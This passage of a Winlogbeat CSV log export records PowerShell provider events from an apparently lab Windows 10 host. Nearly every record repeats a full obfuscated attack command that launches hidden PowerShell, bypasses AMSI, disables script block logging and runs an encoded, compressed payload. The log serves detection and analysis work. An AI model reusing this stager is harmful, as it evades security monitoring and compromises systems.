zjMRqmaeIbv2tc9p''+''HjvvNJQ17rAn''+''7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S''+''r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG''+''N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0''+''fnY1Hl3q{1}fIU{1}bY''+''X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx''+''3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef''+''p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS''+''WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M''+''pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}'')-f''='',''s'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",FileSystem,"-","-","-","-",Started,"-","-","-","	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=72dbcb14-d4f9-4aad-8427-43c1937a4cd2
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=((''{5}na{3}''+''leSc{4}i{1}tBlo''+''c''+''kIn''+''{0}''+''ocation{2}og''+''ging''+'''')-f''v'',''p'',''L'',''b'',''r'',''E''); $eut=[Ref].Assembly.GetType(((''{''+''6''+''}''+''{2}''+''st{''+''9''+''}m.''+''{5}''+''ana''+''{1}{''+''9}m{9}nt.{''+''8}{0}''+''t{7}m''+''a''+''t''+''i''+''{7''+''}n.''+''{8}m''+''s''+''i{4}ti{3}s'')-f''u'',''g'',''y'',''l'',''U'',''M'',''S'',''o'',''A'',''e'')); $oFs1=((''En{2}b''+''l{1}Sc{3}i''+''ptBl''+''o''+''c{0}Logging''+'''')-f''k'',''e'',''a'',''r''); if ($eut) { $eut.GetField(((''a{2}si{1''+''}''+''{''+''0}''+''i{''+''4}Faile{''+''3''+''}''+'''')-f''n'',''I'',''m'',''d'',''t''),''NonPublic,Static'').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType(((''{''+''5}{2}ste''+''m.{1}anagement.''+''{''+''3}{0}t''+''omat''+''ion.{''+''4}tils'')-f''u'',''M'',''y'',''A'',''U'',''S'')); $hagi=((''Scri''+''pt''+''{''+''0}lock{1}og''+''gi{2}g'')-f''B'',''L'',''n''); $fQpa=$q6h.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''''+''Sy{0}''+''tem.Manag''+''ement.{2}{5}tomati''+''on''+''.Scri{''+''1}t''+''B{4}oc{3''+''}'')-f''s'',''p'',''A'',''k'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb''+''gx0SJalyJ9VS''+''wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk''+''kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q''+''p''+''Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W''+''K2QdwmYcTHIgU5J''+''cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA''+''4M''+''peEYdiluJRltrUJfrOpn5+ePFFNAz''+''MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p''+''HjvvNJQ17rAn''+''7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S''+''r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG''+''N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0''+''fnY1Hl3q{1}fIU{1}bY''+''X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx''+''3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef''+''p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS''+''WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M''+''pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}'')-f''='',''s'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6166,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:52:45.061",83kLBIQByII7dpeEXg2S,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:52:45.518","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=72dbcb14-d4f9-4aad-8427-43c1937a4cd2
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=((''{5}na{3}''+''leSc{4}i{1}tBlo''+''c''+''kIn''+''{0}''+''ocation{2}og''+''ging''+'''')-f''v'',''p'',''L'',''b'',''r'',''E''); $eut=[Ref].Assembly.GetType(((''{''+''6''+''}''+''{2}''+''st{''+''9''+''}m.''+''{5}''+''ana''+''{1}{''+''9}m{9}nt.{''+''8}{0}''+''t{7}m''+''a''+''t''+''i''+''{7''+''}n.''+''{8}m''+''s''+''i{4}ti{3}s'')-f''u'',''g'',''y'',''l'',''U'',''M'',''S'',''o'',''A'',''e'')); $oFs1=((''En{2}b''+''l{1}Sc{3}i''+''ptBl''+''o''+''c{0}Logging''+'''')-f''k'',''e'',''a'',''r''); if ($eut) { $eut.GetField(((''a{2}si{1''+''}''+''{''+''0}''+''i{''+''4}Faile{''+''3''+''}''+'''')-f''n'',''I'',''m'',''d'',''t''),''NonPublic,Static'').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType(((''{''+''5}{2}ste''+''m.{1}anagement.''+''{''+''3}{0}t''+''omat''+''ion.{''+''4}tils'')-f''u'',''M'',''y'',''A'',''U'',''S'')); $hagi=((''Scri''+''pt''+''{''+''0}lock{1}og''+''gi{2}g'')-f''B'',''L'',''n''); $fQpa=$q6h.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''''+''Sy{0}''+''tem.Manag''+''ement.{2}{5}tomati''+''on''+''.Scri{''+''1}t''+''B{4}oc{3''+''}'')-f''s'',''p'',''A'',''k'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb''+''gx0SJalyJ9VS''+''wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk''+''kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q''+''p''+''Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W''+''K2QdwmYcTHIgU5J''+''cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA''+''4M''+''peEYdiluJRltrUJfrOpn5+ePFFNAz''+''MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p''+''HjvvNJQ17rAn''+''7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S''+''r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG''+''N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0''+''fnY1Hl3q{1}fIU{1}bY''+''X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx''+''3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef''+''p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS''+''WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M''+''pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}'')-f''='',''s'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Function,"-","-","-","-",Started,"-","-","-","	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=72dbcb14-d4f9-4aad-8427-43c1937a4cd2
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=((''{5}na{3}''+''leSc{4}i{1}tBlo''+''c''+''kIn''+''{0}''+''ocation{2}og''+''ging''+'''')-f''v'',''p'',''L'',''b'',''r'',''E''); $eut=[Ref].Assembly.GetType(((''{''+''6''+''}''+''{2}''+''st{''+''9''+''}m.''+''{5}''+''ana''+''{1}{''+''9}m{9}nt.{''+''8}{0}''+''t{7}m''+''a''+''t''+''i''+''{7''+''}n.''+''{8}m''+''s''+''i{4}ti{3}s'')-f''u'',''g'',''y'',''l'',''U'',''M'',''S'',''o'',''A'',''e'')); $oFs1=((''En{2}b''+''l{1}Sc{3}i''+''ptBl''+''o''+''c{0}Logging''+'''')-f''k'',''e'',''a'',''r''); if ($eut) { $eut.GetField(((''a{2}si{1''+''}''+''{''+''0}''+''i{''+''4}Faile{''+''3''+''}''+'''')-f''n'',''I'',''m'',''d'',''t''),''NonPublic,Static'').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType(((''{''+''5}{2}ste''+''m.{1}anagement.''+''{''+''3}{0}t''+''omat''+''ion.{''+''4}tils'')-f''u'',''M'',''y'',''A'',''U'',''S'')); $hagi=((''Scri''+''pt''+''{''+''0}lock{1}og''+''gi{2}g'')-f''B'',''L'',''n''); $fQpa=$q6h.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''''+''Sy{0}''+''tem.Manag''+''ement.{2}{5}tomati''+''on''+''.Scri{''+''1}t''+''B{4}oc{3''+''}'')-f''s'',''p'',''A'',''k'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb''+''gx0SJalyJ9VS''+''wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk''+''kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q''+''p''+''Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W''+''K2QdwmYcTHIgU5J''+''cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA''+''4M''+''peEYdiluJRltrUJfrOpn5+ePFFNAz''+''MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSMhSOzrhcmwD9Uhy449{1}bBP3OKLTuY5cCB8ikkOxiMXIdA246I{1}jWk{1}oPak+O6Z9T9ceF50wBcjJllU5Dyv5vpOpNQvRIOUnBk2eyRiASiYMQ91nJDP2qG6yB+US2oh+KbNtj3rCL{1}Hf81OxGi1M+p5p5ZQeUjrHd5zjMRqmaeIbv2tc9p''+''HjvvNJQ17rAn''+''7vCMMC7UHVNW1wNHVq3Rc9X2q+lPk9geBw1S''+''r2Vb{1}aaLSbXuS2jrYcDStfa2iel27rKtLgG4KekvQCen27gLGUEYvL/ROoq{1}ddv7NG''+''N5MauZ{1}wtqKZgbehCf252lTUZSGi5u9HUI6d+u93XV1yK/aTqhrEVcahrZE5wgZ0''+''fnY1Hl3q{1}fIU{1}bY''+''X/FtN1gaoW8g3XQomQ1Gpj4YmDoatX7cNhuKrzQm1zjQJ+Mana2uhwHMzW170FVUreOSez7bAnAtjrA/BBnfqDmBBzLNj0j/2OdJDS91jnSQMWe3qBVMV6bFYP9qVONozPrXGF3MdqaiVKeWhtoqn7R8NABx7O{1}DjJJN876pVMcudyef+lNPGV+zL0rTGFjBdXpnZRWm/7ftZteZVbfO5RdNV2+NkIb{1}puYqjdGpHm27vrXx''+''3cHky/Cuv7uBc0eKMv4AdJmPaCTqtUVBaE43raXv3xXue9+6Px7x5rVW0cNxEmAGfIImkKezyWMzq+oWp6mGLMPjYEniiDBop9Bw80xAjHEn7SlQ/aGbHXpM2vJGnb1PL41K0oNg6dhq8qWz{1}xl4CIkVDSoXJPJFUFbv6qoKHUK9U7V9Br39VgZf7aCLDcpphzmgcjDN9qbBGvUkWf7TMMErQkBJew2o1zCDc5dQg6AgHkpDipzOOXuMW36pBxYccQPAqnDtef''+''p82JMDDJyQW6kg0u76uF{1}X/H6j1fqTfMkqXAA/7u/5clz7ze6bOKS''+''WM3CerT9deNQY/tj9J5gKkLOhUjNyeDS8BEOWIY/Cu48M''+''pICXfek7+nItTvrwMtu3in8B0LlurcALAAA{0}'')-f''='',''s'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6167,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:52:45.061",9HkLBIQByII7dpeEXg2S,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:52:45.518","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=72dbcb14-d4f9-4aad-8427-43c1937a4cd2
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $tetRO=[Collections.Generic.Dictionary[string,System.Object]]::new();If($PSVersionTable.PSVersion.Major -ge 3){ $m9rCp=((''{5}na{3}''+''leSc{4}i{1}tBlo''+''c''+''kIn''+''{0}''+''ocation{2}og''+''ging''+'''')-f''v'',''p'',''L'',''b'',''r'',''E''); $eut=[Ref].Assembly.GetType(((''{''+''6''+''}''+''{2}''+''st{''+''9''+''}m.''+''{5}''+''ana''+''{1}{''+''9}m{9}nt.{''+''8}{0}''+''t{7}m''+''a''+''t''+''i''+''{7''+''}n.''+''{8}m''+''s''+''i{4}ti{3}s'')-f''u'',''g'',''y'',''l'',''U'',''M'',''S'',''o'',''A'',''e'')); $oFs1=((''En{2}b''+''l{1}Sc{3}i''+''ptBl''+''o''+''c{0}Logging''+'''')-f''k'',''e'',''a'',''r''); if ($eut) { $eut.GetField(((''a{2}si{1''+''}''+''{''+''0}''+''i{''+''4}Faile{''+''3''+''}''+'''')-f''n'',''I'',''m'',''d'',''t''),''NonPublic,Static'').SetValue($null,$true); }; $q6h=[Ref].Assembly.GetType(((''{''+''5}{2}ste''+''m.{1}anagement.''+''{''+''3}{0}t''+''omat''+''ion.{''+''4}tils'')-f''u'',''M'',''y'',''A'',''U'',''S'')); $hagi=((''Scri''+''pt''+''{''+''0}lock{1}og''+''gi{2}g'')-f''B'',''L'',''n''); $fQpa=$q6h.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($fQpa) { $bFKyh=$fQpa.GetValue($null); $tetRO.Add($oFs1,0); $tetRO.Add($m9rCp,0); $bFKyh[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$hagi]=$tetRO; If($bFKyh[$hagi]){ $bFKyh[$hagi][$m9rCp]=0; $bFKyh[$hagi][$oFs1]=0; } } Else { [Ref].Assembly.GetType(((''''+''Sy{0}''+''tem.Manag''+''ement.{2}{5}tomati''+''on''+''.Scri{''+''1}t''+''B{4}oc{3''+''}'')-f''s'',''p'',''A'',''k'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4{1}IANoAVWMCA7VWbW/aSBD+Xqn/waqQMCrBBtw2RKp0axMDJRCDAwQoOm3{1}tb1l7SX2AiG9/vcb''+''gx0SJalyJ9VS''+''wr7MzM4+88zMeuvIEZRHkteQfr5/J2WfhWMcSnIhxl1nWJYKG216VzpuF9bbC+mrJM/RatXkIabR4uzMWMcxicRhXmkRgZKEhDeMk''+''kQuSf9Ik4DE5OTy5gdxhPRTKvxdaTF+g1kmtjOwExDpBEVuunfBHZw6VrFXjAq5+P17{1}TQ/qS4q57drzBK5aO8SQcKKy1ixJP0q''+''p''+''Qde7VZELvaoE/OEe6IyoVG9VhlFCfZIH6xtSI+IgLtJEe5yvE1MxDqO9pdKrRxk5CIMrZg7yHVjkiTF{1}jRP7c8Xi7/keXb4cB0JGpJKJxIk5iubxBvqkKTSxpHLyJB4C9CyRUwjf1EqgdiGL4lciNaMlaX/Ykbuk20O3VuV5MdKIGWJuFSGmD6/Zo+7a0YOi{1}UX/DzQoARfTgXA71cKoZfT51Z9gT7Hhfyb73cIeCxbPKF71a+SWpZ6cDgWPN7BtHAVr0lp8YC3VLh3ym+1Vc0VQW3FBl0N1uZjTt3F0cKT6Bc2XiryOpObxKMRae4iHFInJ6v8UkSIx8gejkou1gcH5W''+''K2QdwmYcTHIgU5J''+''cYztfOQigddfU2ZS2LkQFQT8AoCXnrqzCFucrET9UgI2B3mwNSCBylCcuk{1}LXb56ekchIoGw0lSlqw15KhTlmyCGXHLEooSmm2hteD7YfHobm/NBHVwInJzi9ITMLNDDR4lIl47EFMA''+''4M''+''peEYdiluJRltrUJfrOpn5+ePFFNAz''+''MGGQOWNpANGAlRcEWKVNi8BNYUarYRHTCFSM